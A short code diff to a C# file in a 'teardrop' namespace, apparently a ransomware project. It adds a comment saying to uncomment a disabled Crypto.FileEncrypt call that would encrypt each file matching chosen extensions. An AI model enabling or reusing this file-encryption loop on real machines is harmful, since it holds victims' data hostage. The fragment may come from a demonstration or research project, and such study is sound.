@@ -131,6 +131,7 @@ namespace teardrop
 
                             if (validExtensions.Contains(ext) && !skipPath.Contains(s))
                             {
+                                // Uncomment Line below to encrypt files
                                 //Crypto.FileEncrypt(s, Properties.Settings.Default.key);
                                 write("Encrypted " + s);
                             }
